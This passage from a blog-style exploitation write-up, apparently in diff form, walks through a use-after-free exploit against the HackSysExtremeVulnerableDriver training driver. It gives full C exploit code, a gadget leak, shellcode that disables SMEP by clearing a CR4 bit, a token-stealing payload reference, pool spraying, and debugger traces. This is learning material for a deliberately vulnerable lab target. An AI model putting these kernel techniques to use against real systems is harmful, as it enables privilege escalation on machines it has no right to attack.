+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nDrivers</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">GetDeviceDriverBaseName</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">szDrivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nf">wcscmp</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">,</span> <span class="n">drvName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">cngBase</span> <span class="o">=</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;cng.sys&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">CALL_RAX_GADGET</span> <span class="o">=</span> <span class="n">cngBase</span> <span class="o">+</span> <span class="mh">0x00c7e1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] leaked cng.sys base @ 0x%016llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cngBase</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Gadget address @ 0x%016llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">CALL_RAX_GADGET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h3>Executing 1st shellcode<span class="hx-absolute -hx-mt-20" id="executing-1st-shellcode"></span>
+    <a href="#executing-1st-shellcode" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>I will provide the final code, the unique difference will be the line 7 with the value of the shellcode, as it is my first time doing a shellcode in my entire life I wanted to document it a little haha.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;UAFHEVD.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Psapi.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x0F\x20\xE0\x48\x25\xFF\xFF\xEF\xFF\x0F\x22\xE0\xC3</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ULONGLONG</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">drvName</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">drivers</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">cbNeeded</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">nDrivers</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">EnumDeviceDrivers</span><span class="p">(</span><span class="n">drivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cbNeeded</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">cbNeeded</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WCHAR</span> <span class="n">szDrivers</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nDrivers</span> <span class="o">=</span> <span class="n">cbNeeded</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nDrivers</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">GetDeviceDriverBaseName</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">szDrivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nf">wcscmp</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">,</span> <span class="n">drvName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">bytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="nf">CreateFile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">L</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Driver not found: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Driver handle: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Allocate the UAF object
+</span></span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Allocating UAF Object...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] UAF Object allocated</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Free
+</span></span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Freeing UAF Object...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Dangling pointer live</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Build fake object:
+</span></span></span><span class="line"><span class="cl">    <span class="n">PFAKE_OBJECT_NON_PAGED_POOL</span> <span class="n">fakeObj</span> <span class="o">=</span> <span class="p">(</span><span class="n">PFAKE_OBJECT_NON_PAGED_POOL</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">cngBase</span> <span class="o">=</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;cng.sys&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">CALL_RAX_GADGET</span> <span class="o">=</span> <span class="n">cngBase</span> <span class="o">+</span> <span class="mh">0x0c7e1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] leaked cng.sys base @ 0x%016llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cngBase</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Gadget address @ 0x%016llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">CALL_RAX_GADGET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fakeObj</span><span class="o">-&gt;</span><span class="n">Callback</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">CALL_RAX_GADGET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">userFA</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">TokenStealingPayloadPsReferencePrimaryToken</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shellcode</span><span class="p">[</span><span class="mi">13</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">userFA</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Size of the shellcode: %zx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fakeObj</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">memcpy</span><span class="p">(</span><span class="n">fakeObj</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Size of shellcode bigger than the buffer space</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Userland payload @ 0x%016llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">userFA</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Spraying %d fake objects...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">100000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">DeviceIoControl</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">hFile</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">fakeObj</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] AllocateFakeObject[%d] failed: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Spray done</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Trigger
+</span></span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Triggering UAF...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Also the header file:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL   IOCTL(0x804)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL        IOCTL(0x805)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL       IOCTL(0x806)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL  IOCTL(0x807)
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define UAF_OBJECT_DATA_SIZE   0x5C
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define UAF_CALLBACK_OFFSET    0x00
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define UAF_BUFFER_FIELD_SIZE  0x54
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#pragma pack(push, 1)
+</span></span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_FAKE_OBJECT_NON_PAGED_POOL</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Callback</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">CHAR</span>  <span class="n">Buffer</span><span class="p">[</span><span class="n">UAF_BUFFER_FIELD_SIZE</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">,</span> <span class="o">*</span> <span class="n">PFAKE_OBJECT_NON_PAGED_POOL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#pragma pack(pop)
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">static_assert</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">)</span> <span class="o">==</span> <span class="n">UAF_OBJECT_DATA_SIZE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;Size mismatch!&#34;</span><span class="p">);</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>From now on, I recommend keeping this website open so you can see the opcodes and assembly code side by side:</p>
+<p><a href="https://defuse.ca/online-x86-assembler.htm" target="_blank" rel="noopener">https://defuse.ca/online-x86-assembler.htm</a></p>
+<p>The first shellcode that works me were:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">0</span><span class="o">:</span>  <span class="mi">90</span>                      <span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="o">:</span>  <span class="mi">90</span>                      <span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="o">:</span>  <span class="mi">90</span>                      <span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="mi">3</span><span class="o">:</span>  <span class="mi">90</span>                      <span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="mi">4</span><span class="o">:</span>  <span class="mi">90</span>                      <span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="mi">5</span><span class="o">:</span>  <span class="mi">90</span>                      <span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="mi">6</span><span class="o">:</span>  <span class="mi">90</span>                      <span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="o">:</span>  <span class="mi">90</span>                      <span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="mi">8</span><span class="o">:</span>  <span class="mf">0f</span> <span class="mi">20</span> <span class="n">e0</span>                <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">cr4</span>
+</span></span><span class="line"><span class="cl"><span class="nl">b</span><span class="p">:</span>  <span class="mi">48</span> <span class="mi">25</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ef</span> <span class="n">ff</span>       <span class="n">and</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0xffffffffffefffff</span>
+</span></span><span class="line"><span class="cl"><span class="mi">11</span><span class="o">:</span> <span class="mf">0f</span> <span class="mi">22</span> <span class="n">e0</span>                <span class="n">mov</span>    <span class="n">cr4</span><span class="p">,</span><span class="n">rax</span>
+</span></span><span class="line"><span class="cl"><span class="mi">14</span><span class="o">:</span> <span class="n">c3</span>                      <span class="n">ret</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>You will be asking, why do you have 8 nops? We use that for padding, if you have been paying attention in the gadget we have <code>add al,0x10</code> and the size of a void pointer is <code>0x08</code>, so we need to ignore another <code>0x08</code> bytes to aling. Once we execute that, the SMEP will be disabled:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">6</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="n">t</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffff8c05</span><span class="err">`</span><span class="n">a9a9a3f0</span> <span class="mf">0f20e0</span>          <span class="n">mov</span>     <span class="n">rax</span><span class="p">,</span><span class="n">cr4</span>
+</span></span><span class="line"><span class="cl"><span class="mi">6</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="n">t</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffff8c05</span><span class="err">`</span><span class="n">a9a9a3f3</span> <span class="mf">4825ff</span><span class="n">ffefff</span>    <span class="n">and</span>     <span class="n">rax</span><span class="p">,</span><span class="mf">0FF</span><span class="n">FFFFFFFFEFFFFFh</span>
